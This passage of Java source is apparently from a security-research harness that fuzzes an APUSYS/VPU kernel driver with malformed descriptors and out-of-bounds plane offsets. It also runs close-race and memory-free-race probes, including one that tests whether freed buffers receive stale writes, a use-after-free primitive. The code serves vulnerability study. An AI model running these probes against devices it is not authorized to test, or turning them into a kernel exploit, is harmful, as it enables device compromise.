            int apusysFd, boolean dispatch, int[] codeSizes, String labelPrefix)
            throws Exception {
        for (int codeSize : codeSizes) {
            XrpSettingsShape shape = new XrpSettingsShape(
                labelPrefix + Integer.toHexString(codeSize),
                XRP_OUTPUT_SIZE_WRAPPER_DEFAULT, XRP_DATA_DESC_SIZE, true,
                codeSize);
            System.out.println("\n[*] === target-settings5/no-settings"
                + " code-size case 0x"
                + Integer.toHexString(codeSize) + " dispatch="
                + (dispatch ? 1 : 0) + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                XRP_OP_ANN_VERSION, 1000, true, VPU_DESC_LIBVPU_SETTINGS5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                shape, dispatch, VPU_REQUEST_FLAGS_DEFAULT, false,
                XRP_OPCODE_XTENSA_ANN_VERSION, null, null, null, null, null,
                null, null);
        }
    }

    private static void runRunCmdVpuXrpTargetSettings5NoSettingsOutputShapeMatrixProbe(
            int apusysFd, boolean dispatch) throws Exception {
        int[] outputSizes = {
            0x00000000,
            0x00000004,
            0x00000010,
            0x0000003c,
            XRP_OUTPUT_SIZE_WRAPPER_DEFAULT,
            XRP_OUTPUT_SIZE_WRAPPER_ONE_OP,
            XRP_OUTPUT_SIZE,
        };
        for (int outputSize : outputSizes) {
            XrpSettingsShape shape = new XrpSettingsShape(
                "wrapper_one_data_output"
                    + Integer.toHexString(outputSize),
                outputSize, XRP_DATA_DESC_SIZE, true);
            System.out.println("\n[*] === target-settings5/no-settings"
                + " output-size case 0x"
                + Integer.toHexString(outputSize) + " header=0x0 dispatch="
                + (dispatch ? 1 : 0) + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                XRP_OP_ANN_VERSION, 1000, true, VPU_DESC_LIBVPU_SETTINGS5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                shape, dispatch, VPU_REQUEST_FLAGS_DEFAULT, false,
                XRP_OPCODE_XTENSA_ANN_VERSION, null, null, null, null, null,
                null, null);
        }

        int[] headerOneSizes = {
            XRP_OUTPUT_SIZE_WRAPPER_DEFAULT,
            XRP_OUTPUT_SIZE_WRAPPER_ONE_OP,
        };
        for (int outputSize : headerOneSizes) {
            XrpSettingsShape shape = new XrpSettingsShape(
                "wrapper_one_data_output"
                    + Integer.toHexString(outputSize) + "_header1",
                outputSize, XRP_DATA_DESC_SIZE, true);
            System.out.println("\n[*] === target-settings5/no-settings"
                + " output-size case 0x"
                + Integer.toHexString(outputSize) + " header=0x1 dispatch="
                + (dispatch ? 1 : 0) + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                XRP_OP_ANN_VERSION, 1000, true, VPU_DESC_LIBVPU_SETTINGS5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_SYNC,
                shape, dispatch, VPU_REQUEST_FLAGS_DEFAULT, false,
                XRP_OPCODE_XTENSA_ANN_VERSION, null, null, null, null, null,
                null, null);
        }
    }

    private static void runRunCmdVpuXrpTargetSettings5NoSettingsDataDescMatrixProbe(
            int apusysFd, boolean dispatch) throws Exception {
        XrpSettingsShape[] shapes = {
            new XrpSettingsShape("wrapper_data_null",
                XRP_OUTPUT_SIZE_WRAPPER_DEFAULT, 0, false),
            new XrpSettingsShape("wrapper_data_size0_nonnull",
                XRP_OUTPUT_SIZE_WRAPPER_DEFAULT, 0, true),
            XrpSettingsShape.WRAPPER_ONE_DATA,
            new XrpSettingsShape("wrapper_data_size18",
                XRP_OUTPUT_SIZE_WRAPPER_DEFAULT, 0x18, true),
            new XrpSettingsShape("wrapper_data_size80",
                XRP_OUTPUT_SIZE_WRAPPER_DEFAULT, 0x80, true),
        };
        for (XrpSettingsShape shape : shapes) {
            System.out.println("\n[*] === target-settings5/no-settings"
                + " data-desc case " + shape.label + " dispatch="
                + (dispatch ? 1 : 0) + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                XRP_OP_ANN_VERSION, 1000, true, VPU_DESC_LIBVPU_SETTINGS5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                shape, dispatch, VPU_REQUEST_FLAGS_DEFAULT, false,
                XRP_OPCODE_XTENSA_ANN_VERSION, null, null, null, null, null,
                null, null);
        }
    }

    private static void runRunCmdVpuXrpTargetSettings5NoSettingsDataEntryMatrixProbe(
            int apusysFd, boolean dispatch) throws Exception {
        XrpDataEntryCase[] cases = {
            new XrpDataEntryCase("standard_flags3_payload",
                new XrpDataDescEntry[] {
                    new XrpDataDescEntry(3, XRP_DATA_PAYLOAD_SIZE,
                        XRP_NZ_DATA_PAYLOAD_OFF),
                }),
            new XrpDataEntryCase("flags1_payload",
                new XrpDataDescEntry[] {
                    new XrpDataDescEntry(1, XRP_DATA_PAYLOAD_SIZE,
                        XRP_NZ_DATA_PAYLOAD_OFF),
                }),
            new XrpDataEntryCase("flags2_payload",
                new XrpDataDescEntry[] {
                    new XrpDataDescEntry(2, XRP_DATA_PAYLOAD_SIZE,
                        XRP_NZ_DATA_PAYLOAD_OFF),
                }),
            new XrpDataEntryCase("flags3_size0_payload",
                new XrpDataDescEntry[] {
                    new XrpDataDescEntry(3, 0, XRP_NZ_DATA_PAYLOAD_OFF),
                }),
            new XrpDataEntryCase("payload_then_plane",
                new XrpDataDescEntry[] {
                    new XrpDataDescEntry(3, XRP_DATA_PAYLOAD_SIZE,
                        XRP_NZ_DATA_PAYLOAD_OFF),
                    new XrpDataDescEntry(3, XRP_PLANE_PAYLOAD_SIZE,
                        XRP_NZ_PLANE_PAYLOAD_OFF),
                }),
            new XrpDataEntryCase("plane_then_payload",
                new XrpDataDescEntry[] {
                    new XrpDataDescEntry(3, XRP_PLANE_PAYLOAD_SIZE,
                        XRP_NZ_PLANE_PAYLOAD_OFF),
                    new XrpDataDescEntry(3, XRP_DATA_PAYLOAD_SIZE,
                        XRP_NZ_DATA_PAYLOAD_OFF),
                }),
        };
        for (XrpDataEntryCase dataCase : cases) {
            XrpSettingsShape shape = new XrpSettingsShape(
                "wrapper_data_entries_" + dataCase.label,
                XRP_OUTPUT_SIZE_WRAPPER_DEFAULT,
                dataCase.entries.length * XRP_DATA_DESC_SIZE, true);
            System.out.println("\n[*] === target-settings5/no-settings"
                + " data-entry case " + dataCase.label + " dispatch="
                + (dispatch ? 1 : 0) + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                XRP_OP_ANN_VERSION, 1000, true, VPU_DESC_LIBVPU_SETTINGS5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                shape, dispatch, VPU_REQUEST_FLAGS_DEFAULT, false,
                XRP_OPCODE_XTENSA_ANN_VERSION, null, null, null, null, null,
                null, null, null, null, dataCase.entries);
        }
    }

    private static void runRunCmdVpuXrpTargetSettings5NoSettingsDataTargetMatrixProbe(
            int apusysFd, boolean dispatch) throws Exception {
        XrpDataEntryCase[] cases = {
            new XrpDataEntryCase("single_settings",
                new XrpDataDescEntry[] {
                    new XrpDataDescEntry(3, XRP_SETTINGS_LEN_WRAPPER,
                        XRP_SETTINGS_OFF),
                }),
            new XrpDataEntryCase("single_code",
                new XrpDataDescEntry[] {
                    new XrpDataDescEntry(3, XRP_CODE_OP_SIZE, XRP_CODE_OFF),
                }),
            new XrpDataEntryCase("single_output",
                new XrpDataDescEntry[] {
                    new XrpDataDescEntry(3, XRP_OUTPUT_SIZE_WRAPPER_DEFAULT,
                        XRP_NZ_OUTPUT_OFF),
                }),
            new XrpDataEntryCase("single_data_desc",
                new XrpDataDescEntry[] {
                    new XrpDataDescEntry(3, XRP_DATA_DESC_SIZE,
                        XRP_NZ_DATA_DESC_OFF),
                }),
            new XrpDataEntryCase("single_data_payload",
                new XrpDataDescEntry[] {
                    new XrpDataDescEntry(3, XRP_DATA_PAYLOAD_SIZE,
                        XRP_NZ_DATA_PAYLOAD_OFF),
                }),
            new XrpDataEntryCase("single_plane_payload",
                new XrpDataDescEntry[] {
                    new XrpDataDescEntry(3, XRP_PLANE_PAYLOAD_SIZE,
                        XRP_NZ_PLANE_PAYLOAD_OFF),
                }),
            new XrpDataEntryCase("payload_then_settings",
                new XrpDataDescEntry[] {
                    new XrpDataDescEntry(3, XRP_DATA_PAYLOAD_SIZE,
                        XRP_NZ_DATA_PAYLOAD_OFF),
                    new XrpDataDescEntry(3, XRP_SETTINGS_LEN_WRAPPER,
                        XRP_SETTINGS_OFF),
                }),
            new XrpDataEntryCase("settings_then_payload",
                new XrpDataDescEntry[] {
                    new XrpDataDescEntry(3, XRP_SETTINGS_LEN_WRAPPER,
                        XRP_SETTINGS_OFF),
                    new XrpDataDescEntry(3, XRP_DATA_PAYLOAD_SIZE,
                        XRP_NZ_DATA_PAYLOAD_OFF),
                }),
            new XrpDataEntryCase("payload_then_code",
                new XrpDataDescEntry[] {
                    new XrpDataDescEntry(3, XRP_DATA_PAYLOAD_SIZE,
                        XRP_NZ_DATA_PAYLOAD_OFF),
                    new XrpDataDescEntry(3, XRP_CODE_OP_SIZE, XRP_CODE_OFF),
                }),
            new XrpDataEntryCase("code_then_payload",
                new XrpDataDescEntry[] {
                    new XrpDataDescEntry(3, XRP_CODE_OP_SIZE, XRP_CODE_OFF),
                    new XrpDataDescEntry(3, XRP_DATA_PAYLOAD_SIZE,
                        XRP_NZ_DATA_PAYLOAD_OFF),
                }),
            new XrpDataEntryCase("payload_then_output",
                new XrpDataDescEntry[] {
                    new XrpDataDescEntry(3, XRP_DATA_PAYLOAD_SIZE,
                        XRP_NZ_DATA_PAYLOAD_OFF),
                    new XrpDataDescEntry(3, XRP_OUTPUT_SIZE_WRAPPER_DEFAULT,
                        XRP_NZ_OUTPUT_OFF),
                }),
            new XrpDataEntryCase("output_then_payload",
                new XrpDataDescEntry[] {
                    new XrpDataDescEntry(3, XRP_OUTPUT_SIZE_WRAPPER_DEFAULT,
                        XRP_NZ_OUTPUT_OFF),
                    new XrpDataDescEntry(3, XRP_DATA_PAYLOAD_SIZE,
                        XRP_NZ_DATA_PAYLOAD_OFF),
                }),
        };
        for (XrpDataEntryCase dataCase : cases) {
            XrpSettingsShape shape = new XrpSettingsShape(
                "wrapper_data_targets_" + dataCase.label,
                XRP_OUTPUT_SIZE_WRAPPER_DEFAULT,
                dataCase.entries.length * XRP_DATA_DESC_SIZE, true);
            System.out.println("\n[*] === target-settings5/no-settings"
                + " data-target case " + dataCase.label + " dispatch="
                + (dispatch ? 1 : 0) + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                XRP_OP_ANN_VERSION, 1000, true, VPU_DESC_LIBVPU_SETTINGS5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                shape, dispatch, VPU_REQUEST_FLAGS_DEFAULT, false,
                XRP_OPCODE_XTENSA_ANN_VERSION, null, null, null, null, null,
                null, null, null, null, dataCase.entries);
        }
    }

    private static void runRunCmdVpuXrpTargetSettings5NoSettingsDataPayloadMatrixProbe(
            int apusysFd, boolean dispatch) throws Exception {
        int[] wordBases = {
            0x00000000,
            0x41505530,
            0x5a5a0000,
            0x7f000000,
        };
        for (int wordBase : wordBases) {
            System.out.println("\n[*] === target-settings5/no-settings"
                + " data-payload case word_base=0x"
                + Integer.toHexString(wordBase) + " dispatch="
                + (dispatch ? 1 : 0) + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                XRP_OP_ANN_VERSION, 1000, true, VPU_DESC_LIBVPU_SETTINGS5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.WRAPPER_ONE_DATA, dispatch,
                VPU_REQUEST_FLAGS_DEFAULT, false, XRP_OPCODE_XTENSA_ANN_VERSION,
                null, null, null, null, null, null, null, null, wordBase,
                null);
        }
    }

    private static void runRunCmdVpuXrpTargetSettings5NoSettingsDescriptorPlaneFuzzProbe(
            int apusysFd, boolean dispatch) throws Exception {
        VpuDescriptorPlaneOverride planeValid =
            new VpuDescriptorPlaneOverride(XRP_NZ_PLANE_PAYLOAD_OFF,
                XRP_PLANE_PAYLOAD_SIZE, 0, XRP_PLANE_PAYLOAD_SIZE, 0,
                1, 0, 0, 0);
        VpuDescriptorPlaneOverride planeZeroSize =
            new VpuDescriptorPlaneOverride(XRP_NZ_PLANE_PAYLOAD_OFF,
                0, 0, 0, 0, 1, 0, 0, 0);
        VpuDescriptorPlaneOverride planeOneByte =
            new VpuDescriptorPlaneOverride(XRP_NZ_PLANE_PAYLOAD_OFF,
                1, 0, 1, 0, 1, 0, 0, 0);
        VpuDescriptorPlaneOverride planeTailExact =
            new VpuDescriptorPlaneOverride(0x3f80, XRP_PLANE_PAYLOAD_SIZE,
                0, XRP_PLANE_PAYLOAD_SIZE, 0, 1, 0, 0, 0);
        VpuDescriptorPlaneOverride planeTailOverflow =
            new VpuDescriptorPlaneOverride(0x3ff0, 0x20, 0, 0x20, 0,
                1, 0, 0, 0);
        VpuDescriptorPlaneOverride planeOnePast =
            new VpuDescriptorPlaneOverride(0x4000, 4, 0, 4, 0,
                1, 0, 0, 0);
        VpuDescriptorPlaneOverride planeTailBytes =
            new VpuDescriptorPlaneOverride(XRP_NZ_PLANE_PAYLOAD_OFF,
                XRP_PLANE_PAYLOAD_SIZE, 1, XRP_PLANE_PAYLOAD_SIZE, 1,
                0xff, 0xff, 0xff, 0xff);
        VpuDescriptorPlaneOverride planeMismatchedWords =
            new VpuDescriptorPlaneOverride(XRP_NZ_PLANE_PAYLOAD_OFF,
                0x4000, 0x100, 0x4010, 0xffffffff, 2, 1, 0, 1);

        XrpDataDescEntry[] payloadThenPlane = {
            new XrpDataDescEntry(3, XRP_DATA_PAYLOAD_SIZE,
                XRP_NZ_DATA_PAYLOAD_OFF),
            new XrpDataDescEntry(3, XRP_PLANE_PAYLOAD_SIZE,
                XRP_NZ_PLANE_PAYLOAD_OFF),
        };
        XrpDataDescEntry[] planeThenPayload = {
            new XrpDataDescEntry(3, XRP_PLANE_PAYLOAD_SIZE,
                XRP_NZ_PLANE_PAYLOAD_OFF),
            new XrpDataDescEntry(3, XRP_DATA_PAYLOAD_SIZE,
                XRP_NZ_DATA_PAYLOAD_OFF),
        };

        VpuDescriptorPlaneCase[] cases = {
            new VpuDescriptorPlaneCase("baseline_default_tail",
                null, null, null, XrpSettingsShape.WRAPPER_ONE_DATA, null),
            new VpuDescriptorPlaneCase("plane_valid_tail",
                XRP_PLANE_PAYLOAD_SIZE, 1, 1,
                new XrpSettingsShape("plane_valid_tail",
                    XRP_OUTPUT_SIZE_WRAPPER_DEFAULT, XRP_DATA_DESC_SIZE,
                    true, planeValid), null),
            new VpuDescriptorPlaneCase("plane_count0",
                XRP_PLANE_PAYLOAD_SIZE, 0, 1,
                new XrpSettingsShape("plane_count0",
                    XRP_OUTPUT_SIZE_WRAPPER_DEFAULT, XRP_DATA_DESC_SIZE,
                    true, planeValid), null),
            new VpuDescriptorPlaneCase("plane_count2",
                XRP_PLANE_PAYLOAD_SIZE, 2, 1,
                new XrpSettingsShape("plane_count2",
                    XRP_OUTPUT_SIZE_WRAPPER_DEFAULT, XRP_DATA_DESC_SIZE,
                    true, planeValid), null),
            new VpuDescriptorPlaneCase("plane_countff",
                XRP_PLANE_PAYLOAD_SIZE, 0xff, 1,
                new XrpSettingsShape("plane_countff",
                    XRP_OUTPUT_SIZE_WRAPPER_DEFAULT, XRP_DATA_DESC_SIZE,
                    true, planeValid), null),
            new VpuDescriptorPlaneCase("plane_size0",
                0, 1, 1,
                new XrpSettingsShape("plane_size0",
                    XRP_OUTPUT_SIZE_WRAPPER_DEFAULT, XRP_DATA_DESC_SIZE,
                    true, planeZeroSize), null),
            new VpuDescriptorPlaneCase("plane_size1",
                1, 1, 1,
                new XrpSettingsShape("plane_size1",
                    XRP_OUTPUT_SIZE_WRAPPER_DEFAULT, XRP_DATA_DESC_SIZE,
                    true, planeOneByte), null),
            new VpuDescriptorPlaneCase("plane_tail_exact",
                XRP_PLANE_PAYLOAD_SIZE, 1, 1,
                new XrpSettingsShape("plane_tail_exact",
                    XRP_OUTPUT_SIZE_WRAPPER_DEFAULT, XRP_DATA_DESC_SIZE,
                    true, planeTailExact), null),
            new VpuDescriptorPlaneCase("plane_tail_overflow",
                0x20, 1, 1,
                new XrpSettingsShape("plane_tail_overflow",
                    XRP_OUTPUT_SIZE_WRAPPER_DEFAULT, XRP_DATA_DESC_SIZE,
                    true, planeTailOverflow), null),
            new VpuDescriptorPlaneCase("plane_one_past",
                4, 1, 1,
                new XrpSettingsShape("plane_one_past",
                    XRP_OUTPUT_SIZE_WRAPPER_DEFAULT, XRP_DATA_DESC_SIZE,
                    true, planeOnePast), null),
            new VpuDescriptorPlaneCase("tail_bytes_ff",
                XRP_PLANE_PAYLOAD_SIZE, 1, 1,
                new XrpSettingsShape("tail_bytes_ff",
                    XRP_OUTPUT_SIZE_WRAPPER_DEFAULT, XRP_DATA_DESC_SIZE,
                    true, planeTailBytes), null),
            new VpuDescriptorPlaneCase("tail_word_mismatch",
                XRP_PLANE_PAYLOAD_SIZE, 1, 1,
                new XrpSettingsShape("tail_word_mismatch",
                    XRP_OUTPUT_SIZE_WRAPPER_DEFAULT, XRP_DATA_DESC_SIZE,
                    true, planeMismatchedWords), null),
            new VpuDescriptorPlaneCase("data_desc_size0_nonnull",
                XRP_PLANE_PAYLOAD_SIZE, 1, 1,
                new XrpSettingsShape("data_desc_size0_nonnull",
                    XRP_OUTPUT_SIZE_WRAPPER_DEFAULT, 0, true, planeValid),
                null),
            new VpuDescriptorPlaneCase("data_desc_size18_payload_then_plane",
                XRP_PLANE_PAYLOAD_SIZE, 1, 1,
                new XrpSettingsShape("data_desc_size18_payload_then_plane",
                    XRP_OUTPUT_SIZE_WRAPPER_DEFAULT, 0x18, true, planeValid),
                payloadThenPlane),
            new VpuDescriptorPlaneCase("data_desc_size18_plane_then_payload",
                XRP_PLANE_PAYLOAD_SIZE, 1, 1,
                new XrpSettingsShape("data_desc_size18_plane_then_payload",
                    XRP_OUTPUT_SIZE_WRAPPER_DEFAULT, 0x18, true, planeValid),
                planeThenPayload),
            new VpuDescriptorPlaneCase("data_desc_size80_tail_bytes",
                XRP_PLANE_PAYLOAD_SIZE, 1, 1,
                new XrpSettingsShape("data_desc_size80_tail_bytes",
                    XRP_OUTPUT_SIZE_WRAPPER_DEFAULT, 0x80, true,
                    planeTailBytes), payloadThenPlane),
        };

        for (VpuDescriptorPlaneCase planeCase : cases) {
            System.out.println("\n[*] === target-settings5/no-settings"
                + " descriptor-plane case " + planeCase.label
                + " dispatch=" + (dispatch ? 1 : 0) + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                XRP_OP_ANN_VERSION, 1000, true, VPU_DESC_LIBVPU_SETTINGS5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                planeCase.settingsShape, dispatch, VPU_REQUEST_FLAGS_DEFAULT,
                false, XRP_OPCODE_XTENSA_ANN_VERSION,
                planeCase.descriptorPayloadSize, null, null, null, null,
                planeCase.descriptorPlaneCount, planeCase.descriptorHeight,
                null, null, planeCase.dataDescEntries);
        }
    }

    private static void runRunCmdVpuXrpTargetSettings5NoSettingsCmdCopybackDiffProbe(
            int apusysFd, boolean dispatch) throws Exception {
        int[] requestFlags = {
            VPU_REQUEST_FLAGS_DEFAULT,
            VPU_REQUEST_FLAGS_PRELOAD_SLOT,
        };
        for (int flags : requestFlags) {
            System.out.println("\n[*] === target-settings5/no-settings"
                + " command-copyback-diff request_flags=0x"
                + Integer.toHexString(flags) + " dispatch="
                + (dispatch ? 1 : 0) + " ===");
            int waitMs = flags == VPU_REQUEST_FLAGS_PRELOAD_SLOT ? 20000 : 1000;
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                XRP_OP_ANN_VERSION, waitMs, true, VPU_DESC_LIBVPU_SETTINGS5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.WRAPPER_ONE_DATA, dispatch, flags, false,
                null, null, null, null, null, null, null, null, null, null,
                null, true);
        }
    }

    private static void runRunCmdVpuXrpCloseRaceHardwareBufferProbe()
            throws Exception {
        System.out.println("\n[*] === APUSYS run_cmd VPU close-race lifetime probe ===");
        System.out.println("[*] Mode: each case opens a temporary /dev/apusys fd,"
            + " submits run_cmd_async, closes that fd without wait_cmd, and"
            + " keeps the HardwareBuffers alive while scheduler/provider cleanup"
            + " completes.");

        runRunCmdVpuXrpCloseRaceCompletedCase();
        runRunCmdVpuXrpCloseRaceTimeoutCase();
    }

    private static void runRunCmdVpuXrpCloseRaceDelayMatrixProbe()
            throws Exception {
        System.out.println("\n[*] === APUSYS run_cmd VPU close-race delay"
            + " matrix probe ===");
        System.out.println("[*] Mode: focused lifetime/copyback risk batch."
            + " For each close delay, submit run_cmd_async, skip wait_cmd,"
            + " close the APUSYS fd, keep buffers alive, and diff the full"
            + " 0xb70 command request after scheduler/provider cleanup.");

        int[] closeDelaysMs = {0, 10, 50, 100, 500, 1000};
        for (int delayMs : closeDelaysMs) {
            runRunCmdVpuXrpCloseRaceCompletedDelayCase(delayMs);
        }
        for (int delayMs : closeDelaysMs) {
            runRunCmdVpuXrpCloseRaceTimeoutDelayCase(delayMs);
        }
    }

    private static void runRunCmdVpuXrpCloseRaceCompletedCase()
            throws Exception {
        runRunCmdVpuXrpCloseRaceCompletedDelayCase(100, false);
    }

    private static void runRunCmdVpuXrpCloseRaceCompletedDelayCase(
            int closeDelayMs) throws Exception {
        runRunCmdVpuXrpCloseRaceCompletedDelayCase(closeDelayMs, true);
    }

    private static void runRunCmdVpuXrpCloseRaceCompletedDelayCase(
            int closeDelayMs, boolean fullCopybackDiff) throws Exception {
        int raceFd = -1;
        try {
            raceFd = DrmTrigger.openDev(APUSYS_DEV);
            System.out.println("\n[*] === close-race case A:"
                + " completed settings5/no-settings close_after="
                + closeDelayMs + "ms post_close_wait=5000ms"
                + " copyback_diff=" + (fullCopybackDiff ? 1 : 0)
                + " ===");
            int ownedFd = raceFd;
            raceFd = -1;
            runRunCmdVpuIovaHardwareBufferProbe(ownedFd, true, true, true,
                XRP_OP_ANN_VERSION, 5000, true, VPU_DESC_LIBVPU_SETTINGS5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.WRAPPER_ONE_DATA, false,
                VPU_REQUEST_FLAGS_DEFAULT, false, null, null, null, null,
                null, null, null, null, null, null, null, fullCopybackDiff,
                Integer.valueOf(closeDelayMs), null);
        } finally {
            if (raceFd >= 0) {
                DrmTrigger.closeFd(raceFd);
            }
        }
    }

    private static void runRunCmdVpuXrpCloseRaceTimeoutCase()
            throws Exception {
        runRunCmdVpuXrpCloseRaceTimeoutDelayCase(500, false);
    }

    private static void runRunCmdVpuXrpCloseRaceTimeoutDelayCase(
            int closeDelayMs) throws Exception {
        runRunCmdVpuXrpCloseRaceTimeoutDelayCase(closeDelayMs, true);
    }

    private static void runRunCmdVpuXrpCloseRaceTimeoutDelayCase(
            int closeDelayMs, boolean fullCopybackDiff) throws Exception {
        int raceFd = -1;
        try {
            raceFd = DrmTrigger.openDev(APUSYS_DEV);
            System.out.println("\n[*] === close-race case B:"
                + " timeout minimal/split ANN_VERSION close_after="
                + closeDelayMs + "ms post_close_wait=15000ms"
                + " copyback_diff=" + (fullCopybackDiff ? 1 : 0)
                + " ===");
            int ownedFd = raceFd;
            raceFd = -1;
            runRunCmdVpuIovaHardwareBufferProbe(ownedFd, true, true, true,
                XRP_OP_ANN_VERSION, 15000, false, VPU_DESC_MINIMAL,
                XRP_CMD_FLAGS_INITIAL, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.CURRENT, false, VPU_REQUEST_FLAGS_DEFAULT,
                true, null, null, null, null, null, null, null, null, null,
                null, null, fullCopybackDiff, Integer.valueOf(closeDelayMs),
                null);
        } finally {
            if (raceFd >= 0) {
                DrmTrigger.closeFd(raceFd);
            }
        }
    }

    private static void runRunCmdVpuXrpMemFreeRaceHardwareBufferProbe()
            throws Exception {
        System.out.println("\n[*] === APUSYS run_cmd VPU mem-free-race lifetime probe ===");
        System.out.println("[*] Mode: each case opens a temporary /dev/apusys fd,"
            + " submits run_cmd_async, frees the imported shared IOVA via"
            + " APUSYS_CMD_MEM_FREE while the fd remains open, keeps the"
            + " HardwareBuffers alive, then calls wait_cmd.");
        int[] freeDelaysMs = {0, 10, 50, 100, 500};
        for (int delayMs : freeDelaysMs) {
            runRunCmdVpuXrpMemFreeRaceTimeoutCase(delayMs);
        }
    }

    private static void runRunCmdVpuXrpMemFreeRaceTimeoutCase(int freeDelayMs)
            throws Exception {
        int raceFd = -1;
        try {
            raceFd = DrmTrigger.openDev(APUSYS_DEV);
            System.out.println("\n[*] === mem-free-race case:"
                + " timeout minimal/split ANN_VERSION free_after="
                + freeDelayMs + "ms post_free_wait=15000ms ===");
            runRunCmdVpuIovaHardwareBufferProbe(raceFd, true, true, true,
                XRP_OP_ANN_VERSION, 15000, false, VPU_DESC_MINIMAL,
                XRP_CMD_FLAGS_INITIAL, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.CURRENT, false, VPU_REQUEST_FLAGS_DEFAULT,
                true, null, null, null, null, null, null, null, null, null,
                null, null, false, null, Integer.valueOf(freeDelayMs));
        } finally {
            if (raceFd >= 0) {
                DrmTrigger.closeFd(raceFd);
            }
        }
    }

    private static void runRunCmdVpuXrpMemFreeRaceCompletedHardwareBufferProbe()
            throws Exception {
        System.out.println("\n[*] === APUSYS run_cmd VPU mem-free-race completed-writeback probe ===");
        System.out.println("[*] Mode: each case opens a temporary /dev/apusys fd,"
            + " submits the stable settings5/no-settings APUNN request, frees"
            + " the imported shared IOVA via APUSYS_CMD_MEM_FREE while the fd"
            + " remains open, then waits and dumps both buffers.");
        int[] freeDelaysMs = {0, 1, 5, 10, 50};
        for (int delayMs : freeDelaysMs) {
            runRunCmdVpuXrpMemFreeRaceCompletedCase(delayMs);
        }
    }

    private static void runRunCmdVpuXrpMemFreeRaceCompletedCase(int freeDelayMs)
            throws Exception {
        int raceFd = -1;
        try {
            raceFd = DrmTrigger.openDev(APUSYS_DEV);
            System.out.println("\n[*] === mem-free-race completed case:"
                + " settings5/no-settings ANN_VERSION free_after="
                + freeDelayMs + "ms post_free_wait=1000ms ===");
            runRunCmdVpuIovaHardwareBufferProbe(raceFd, true, true, true,
                XRP_OP_ANN_VERSION, 1000, true, VPU_DESC_LIBVPU_SETTINGS5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.WRAPPER_ONE_DATA, false,
                VPU_REQUEST_FLAGS_DEFAULT, false, null, null, null, null,
                null, null, null, null, null, null, null, false, null,
                Integer.valueOf(freeDelayMs));
        } finally {
            if (raceFd >= 0) {
                DrmTrigger.closeFd(raceFd);
            }
        }
    }

    private static void runRunCmdVpuXrpMemFreeRaceCompletedReuseHardwareBufferProbe()
            throws Exception {
        System.out.println("\n[*] === APUSYS run_cmd VPU mem-free-race"
            + " completed-writeback reuse-pressure probe ===");
        System.out.println("[*] Mode: each case frees the original shared IOVA"
            + " after async submit, immediately imports same-size replacement"
            + " HardwareBuffers, then checks whether old completion writes land"
            + " on a replacement buffer.");
        int[] freeDelaysMs = {0, 1, 5};
        for (int delayMs : freeDelaysMs) {
            runRunCmdVpuXrpMemFreeRaceCompletedReuseCase(delayMs,
                MAX_REUSE_IMPORTS);
        }
    }

    private static void runRunCmdVpuXrpMemFreeRaceCompletedReuseCase(
            int freeDelayMs, int replacementImportCount) throws Exception {
        int raceFd = -1;
        try {
            raceFd = DrmTrigger.openDev(APUSYS_DEV);
            System.out.println("\n[*] === mem-free-race completed reuse case:"
                + " settings5/no-settings ANN_VERSION free_after="
                + freeDelayMs + "ms replacements=" + replacementImportCount
                + " post_free_wait=1000ms ===");
            runRunCmdVpuIovaHardwareBufferProbe(raceFd, true, true, true,
                XRP_OP_ANN_VERSION, 1000, true, VPU_DESC_LIBVPU_SETTINGS5,
